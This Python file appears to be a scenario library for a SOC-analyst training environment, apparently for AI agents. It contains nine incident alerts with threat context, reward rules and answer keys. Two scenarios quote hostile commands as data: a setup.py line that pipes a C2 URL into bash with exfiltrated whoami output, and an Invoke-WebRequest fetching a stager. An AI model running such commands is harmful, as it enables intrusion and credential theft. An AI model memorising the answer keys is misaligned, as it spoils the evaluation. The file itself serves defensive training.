# Copyright (c) Meta Platforms, Inc. and affiliates.
# All rights reserved.
#
# This source code is licensed under the BSD-style license found in the
# LICENSE file in the root directory of this source tree.

"""
SOC Scenario Library — Real-World Threat Intelligence Scenarios.

Grounded in:
  - MITRE ATT&CK Enterprise (https://attack.mitre.org)
  - Real CVE references
  - Named threat actor TTPs (APT28, Lazarus Group, BlackCat, Scattered Spider)
  - Authentic SOC analyst decision playbooks (NIST SP 800-61)

Reward logic:
  - Correct terminal action     : +1.0
  - Good intermediate step      : +0.3
  - Investigate (always valid)  : +0.1 to +0.15
  - Unnecessary escalation      : -0.2
  - Wrong terminal              : -0.3
  - False positive, ignoring it : +0.8
  - False positive, overreacting: -0.3
  - Repeat action               : -0.1
"""

from typing import Any, Dict, List

SCENARIOS: List[Dict[str, Any]] = [

    # ─────────────── EASY ───────────────

    {
        "id": "easy_impossible_travel",
        "alert_type": "impossible_travel_login",
        "severity": "high",
        "difficulty": "easy",
        "initial_signals": [
            "Login from Seoul, South Korea at 06:12 UTC",
            "Login from Lagos, Nigeria at 06:51 UTC (same account)",
            "Account: finance analyst — payroll access",
            "Physical distance: ~11,700 km in 39 minutes (physically impossible)",
            "Both logins succeeded — no MFA challenge triggered",
        ],
        "investigation_context": {
            "account_privileges": "payroll system write access, wire transfer approval up to $50K",
            "previous_travel": "no international travel in 180 days",
            "mfa_status": "enrolled but SMS OTP — known SIM-swap risk",
            "threat_intel": "Active Nigerian BEC campaign targeting finance teams this week",
            "mitre_technique": "T1078.004 — Valid Accounts: Cloud Accounts",
            "recent_wire_requests": "2 pending wire transfers totaling $87,000 submitted 20 min ago",
        },
        "correct_sequence": ["investigate", "block_account", "request_mfa"],
        "optimal_terminal": "block_account",
        "false_positive": False,
        "description": (
            "Impossible travel: finance analyst account logged in from two locations "
            "11,700 km apart within 39 minutes. Active BEC campaign in progress. "
            "Account has wire transfer approval — immediate containment required."
        ),
    },

    {
        "id": "easy_false_positive_vpn",
        "alert_type": "anomalous_login_location",
        "severity": "low",
        "difficulty": "easy",
        "initial_signals": [
            "Login from Zurich, Switzerland (first time for this user)",
            "Account: junior marketing analyst",
            "Login succeeded — Authenticator app MFA passed",
            "Device: managed MacBook (MDM enrolled, compliant)",
            "Time: 09:15 local time (business hours)",
        ],
        "investigation_context": {
            "vpn_provider": "Corporate Zscaler ZPA exit node — Zurich PoP",
            "user_submitted_travel_request": "Approved — Basel tech conference, 3-day trip",
            "device_compliance": "Fully patched, encrypted, CrowdStrike installed",
            "previous_vpn_alerts": "2 similar alerts in past year — both false positives",
            "asset_risk": "Low — no access to sensitive systems or financial data",
            "mitre_note": "No ATT&CK technique — authorized access via corporate VPN",
        },
        "correct_sequence": ["investigate", "ignore"],
        "optimal_terminal": "ignore",
        "false_positive": True,
        "description": (
            "Junior marketing analyst using corporate ZPA VPN from approved conference travel. "
            "Strong MFA, managed device, low-risk account. Classic geo-alert false positive."
        ),
    },

    {
        "id": "easy_emotet_dropper",
        "alert_type": "malware_detection",
        "severity": "critical",
        "difficulty": "easy",
        "initial_signals": [
            "CrowdStrike: Emotet dropper detected — prevention blocked execution",
            "File: invoice_overdue_ref8821.xlsm (macro-enabled Excel)",
            "Delivered via email — sender: invoices@supplier-billing[.]net (spoofed domain)",
            "Endpoint: Windows 11 workstation, user has local admin rights",
            "Process attempted: Excel.exe → cmd.exe → powershell.exe -enc [base64]",
        ],
        "investigation_context": {
            "file_hash": "SHA256: a3f1c2d4... — 71/72 AV engines flag as Emotet variant",
            "c2_beaconing": "Blocked outbound to 91.240.118.168:8080 — Emotet C2 (Abuse.ch)",
            "lateral_movement": "Not detected — execution was blocked before C2 established",
            "email_campaign": "Same lure sent to 34 users in past 2 hours — 3 others clicked",
            "cve_exploited": "CVE-2022-30190 (Follina) used in macro if user enables content",
            "mitre_techniques": [
                "T1566.001 — Phishing: Spearphishing Attachment",
                "T1059.001 — Command and Scripting Interpreter: PowerShell",
                "T1105 — Ingress Tool Transfer",
            ],
        },
        "correct_sequence": ["isolate_device", "collect_forensics", "escalate"],
        "optimal_terminal": "isolate_device",
        "false_positive": False,
        "description": (
            "Emotet dropper delivered via phishing email. EDR blocked execution but "
            "3 other users may have also clicked. CVE-2022-30190 exploitation attempted. "
            "Isolate immediately and check for lateral spread."
        ),
    },

    # ─────────────── MEDIUM ───────────────

    {
        "id": "medium_rdp_brute_force",
        "alert_type": "brute_force_rdp",
        "severity": "high",
        "difficulty": "medium",
        "initial_signals": [
            "2,847 failed RDP login attempts in 6 minutes from 45.141.84.120",
            "Target: internet-facing jump server (RDP exposed on port 3389)",
            "12 successful logins detected in final burst — username: svc_deploy",
            "Login time: 03:22 UTC Saturday (off-hours, no change window)",
            "Geo: Source IP resolves to Bucharest, Romania",
        ],
        "investigation_context": {
            "source_ip_intel": "Listed on 4 threat feeds — Scattered Spider infrastructure",
            "svc_deploy_account": "Service account — last legitimate use 5 months ago",
            "post_login_commands": [
                "whoami /all",
                "net group 'Domain Admins' /domain",
                "nltest /domain_trusts",
                "Invoke-WebRequest hxxp://transfer.sh/payload.exe -OutFile C:\\Windows\\Temp\\svc.exe",
            ],
            "payload_analysis": "svc.exe — Cobalt Strike stager (VirusTotal: 58/72)",
            "mitre_techniques": [
                "T1110.001 — Brute Force: Password Guessing",
                "T1021.001 — Remote Services: RDP",
                "T1087.002 — Account Discovery: Domain Account",
                "T1105 — Ingress Tool Transfer",
            ],
            "threat_actor": "Scattered Spider (UNC3944) — known for RDP brute force then ransomware",
        },
        "correct_sequence": ["investigate", "block_ip", "block_account", "isolate_device"],
        "optimal_terminal": "block_ip",
        "false_positive": False,
        "description": (
            "Scattered Spider RDP brute force succeeded on dormant service account. "
            "Attacker downloaded Cobalt Strike stager. Active intrusion in progress — "
            "block source IP and isolate jump server before lateral movement begins."
        ),
    },

    {
        "id": "medium_insider_threat",
        "alert_type": "data_exfiltration_attempt",
        "severity": "high",
        "difficulty": "medium",
        "initial_signals": [
            "DLP: 8.3 GB uploaded to personal Dropbox in 47 minutes",
            "Account: senior software engineer — R&D team",
            "Files: source code, architecture diagrams, API keys (DLP classifier triggered)",
            "Upload time: 22:14 local time — after business hours",
            "VPN connected — corporate laptop",
        ],
        "investigation_context": {
            "employee_status": "Resignation letter submitted yesterday — last day in 2 weeks",
            "destination_confirmed": "LinkedIn shows new role at direct competitor starting next month",
            "files_staged": [
                "proprietary_algorithm_v4.py (core product IP)",
                "prod_api_keys.env (live AWS + Stripe keys)",
                "customer_db_export_2024.csv (47,000 records — PII)",
                "architecture_roadmap_2025.pdf (confidential)",
            ],
            "legal_hold_required": True,
            "prior_anomalies": "3 large downloads from code repo in past week — not flagged",
            "mitre_technique": "T1048.003 — Exfiltration Over Alternative Protocol: Web Service",
            "regulatory_exposure": "GDPR + SOC2 violation if customer PII confirmed exfiltrated",
        },
        "correct_sequence": ["investigate", "block_account", "collect_forensics", "escalate"],
        "optimal_terminal": "escalate",
        "false_positive": False,
        "description": (
            "Departing R&D engineer exfiltrating source code, live API keys, and 47K customer "
            "records to personal Dropbox. Legal hold required. GDPR/SOC2 exposure possible. "
            "Forensics must be preserved — escalate to legal and IR team immediately."
        ),
    },

    {
        "id": "medium_aitm_phishing",
        "alert_type": "phishing_link_clicked",
        "severity": "high",
        "difficulty": "medium",
        "initial_signals": [
            "User clicked link in email: 'Urgent: Your M365 account will be suspended'",
            "URL: https://login.microsoftonline-secure-verify[.]com (typosquat)",
            "User: executive assistant to CFO — has calendar and email delegation",
            "Browser redirected through Cloudflare Worker (AiTM proxy detected)",
            "Email sent from compromised partner domain — passed SPF/DKIM",
        ],
        "investigation_context": {
            "url_verdict": "EvilProxy AiTM phishing kit — real-time session token harvesting",
            "session_cookie_status": "Token theft likely — user entered credentials on fake page",
            "mfa_type": "SMS OTP — susceptible to AiTM bypass (token already issued)",
            "cfo_exposure": "EA has full mailbox delegation, can approve payments up to $500K",
            "active_session_detected": "New sign-in from 185.220.101.34 (Tor) 4 minutes ago",
            "mitre_techniques": [
                "T1557.001 — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning",
                "T1528 — Steal Application Access Token",
                "T1534 — Internal Spearphishing",
            ],
            "threat_intel": "Storm-1167 BEC group — targeting EA accounts for payment fraud",
        },
        "correct_sequence": ["investigate", "request_mfa", "monitor"],
        "optimal_terminal": "request_mfa",
        "false_positive": False,
        "description": (
            "EvilProxy AiTM attack against CFO executive assistant. Session token likely stolen — "
            "MFA already bypassed. Active Tor session detected. Force MFA reset to phishing-resistant "
            "method (FIDO2) and monitor CFO mailbox for fraudulent payment requests."
        ),
    },

    # ─────────────── HARD ───────────────

    {
        "id": "hard_apt_lateral_movement",
        "alert_type": "lateral_movement_detected",
        "severity": "critical",
        "difficulty": "hard",
        "initial_signals": [
            "CrowdStrike: Pass-the-Hash detected — WS-04 authenticating as DA-svc account",
            "SIEM: SMB lateral movement chain: WS-01 → WS-04 → FS-01 → DC-01 (in progress)",
            "EDR: LSASS dumped via custom reflective DLL on WS-01 at 03:17 UTC",
            "Firewall: Beacon to 185.220.101.99:443 every 28s — Cobalt Strike malleable C2",
            "AV: Zero detections — fully fileless, living-off-the-land binaries only",
            "Alert time: 03:19 UTC Sunday — no IT staff on call",
        ],
        "investigation_context": {
            "threat_actor": "APT29 (Cozy Bear/Midnight Blizzard) — 91% TTP confidence match",
            "initial_access": "Spear-phishing ISO attachment exploiting CVE-2023-36884 — 56h ago",
            "c2_infrastructure": "185.220.101.99 — Mandiant tracked APT29 server, active since Monday",
            "accounts_compromised": [
                "WS-01 local admin (original foothold)",
                "svc_backup — domain service account with backup operator rights",
                "DA-svc — domain admin hash captured via LSASS dump, cracking in progress",
            ],
            "persistence": [
                "WMI subscription: 'SystemMonitor' (WS-01, WS-04)",
                "Registry: HKLM\\System\\CurrentControlSet\\Services\\WinDefend (tampered)",
            ],
            "dc_status": "DC-01 not yet reached — SMB auth failed twice, retrying",
            "exfiltration": "Not detected yet — likely staging phase",
            "mitre_techniques": [
                "T1550.002 — Use Alternate Authentication Material: Pass the Hash",
                "T1003.001 — OS Credential Dumping: LSASS Memory",
                "T1071.001 — Application Layer Protocol: Web Protocols (C2)",
                "T1547.001 — Boot or Logon Autostart: Registry Run Keys",
                "T1218 — System Binary Proxy Execution (LOLBins)",
            ],
        },
        "correct_sequence": [
            "investigate",
            "isolate_device",
            "block_ip",
            "collect_forensics",
            "escalate",
        ],
        "optimal_terminal": "escalate",
        "false_positive": False,
        "description": (
            "Active APT29 intrusion — Cobalt Strike C2 live, Pass-the-Hash lateral movement "
            "progressing toward Domain Controller. DA hash being cracked. CVE-2023-36884 "
            "initial access 56h ago. DC-01 not yet compromised — window to contain is closing."
        ),
    },

    {
        "id": "hard_supply_chain_pypi",
        "alert_type": "suspicious_package_behavior",
        "severity": "critical",
        "difficulty": "hard",
        "initial_signals": [
            "SIEM: Python package 'requests-enhanced' v3.1.2 spawning shell on 8 dev machines",
            "DNS: dev machines querying c2.pypi-cdn[.]io every 60s (newly registered domain)",
            "Package installed yesterday via pip — was in internal PyPI mirror",
            "Package name typosquats 'requests' (200M weekly downloads) — easy to miss",
            "No CVE — zero-day supply chain, maintainer account hijacked via credential stuffing",
        ],
        "investigation_context": {
            "package_payload": (
                "setup.py __import__('os').system("
                "'curl -s https://c2.pypi-cdn[.]io/$(whoami|base64) | bash')"
            ),
            "domain_registration": "c2.pypi-cdn[.]io — registered 6 days ago, Namecheap privacy",
            "affected_machines": "8 developer workstations — all have AWS prod creds in ~/.aws/",
            "aws_exposure": [
                "IAM keys with S3 full access (prod data lake — 2TB customer data)",
                "EC2 describe permissions (full infrastructure enumeration)",
                "Secrets Manager read access (DB passwords, API keys)",
            ],
            "cloudtrail_anomalies": "3 unusual GetSecretValue API calls in last 90 min — staged?",
            "github_status": "No suspicious commits yet — attacker may be mapping codebase",
            "mitre_techniques": [
                "T1195.001 — Supply Chain Compromise: Compromise Software Dependencies",
                "T1552.001 — Unsecured Credentials: Credentials In Files",
                "T1078.004 — Valid Accounts: Cloud Accounts",
            ],
            "threat_intel": "Lazarus Group TTPs — DPRK state-sponsored, financial motivation",
        },
        "correct_sequence": [
            "investigate",
            "patch_system",
            "collect_forensics",
            "monitor",
            "escalate",
        ],
        "optimal_terminal": "patch_system",
        "false_positive": False,
        "description": (
            "Lazarus Group supply chain attack via hijacked PyPI package on 8 dev machines. "
            "AWS prod credentials exposed. CloudTrail shows early-stage enumeration. "
            "Remove package immediately, rotate all secrets, preserve forensics before attacker pivots."
        ),
    },

    {
        "id": "hard_authorized_pentest",
        "alert_type": "port_scan_detected",
        "severity": "medium",
        "difficulty": "hard",
        "initial_signals": [
            "IDS: Aggressive Nmap scan — 65,535 ports probed in 90 seconds",
            "Source: 10.10.50.15 scanning entire 10.0.0.0/8 internal network",
            "Scan type: SYN stealth scan with OS fingerprinting and version detection",
            "Ports targeted include: 22, 23, 80, 443, 445, 1433, 3306, 3389, 5432, 8080",
            "No firewall blocks — internal network segment",
        ],
        "investigation_context": {
            "source_host": "PENTEST-VM-01 — dedicated penetration testing VM",
            "authorized_by": "SOW signed by CISO — annual penetration test engagement",
            "pentest_firm": "Engagement letter on file — reputable third-party firm",
            "rules_of_engagement": "Full internal network scope — signed RoE document CHG-9921",
            "schedule": "Pentest window: Mon–Fri 08:00–18:00 UTC — current time 10:34 UTC Tuesday",
            "ids_note": "IDS rule updated last week without pentest whitelist — caused this alert",
            "previous_scans": "11 identical engagement scans in 3 years — all authorized",
        },
        "correct_sequence": ["investigate", "ignore"],
        "optimal_terminal": "ignore",
        "false_positive": True,
        "description": (
            "Authorized annual penetration test triggering IDS after whitelist not updated. "
            "Signed SOW, RoE document, CISO approval, within scheduled window. "
            "Update IDS whitelist and close alert — do not disrupt the pentest engagement."
        ),
    },
]

# Quick lookup by difficulty
EASY_SCENARIOS   = [s for s in SCENARIOS if s["difficulty"] == "easy"]
MEDIUM_SCENARIOS = [s for s in SCENARIOS if s["difficulty"] == "medium"]
HARD_SCENARIOS   = [s for s in SCENARIOS if s["difficulty"] == "hard"]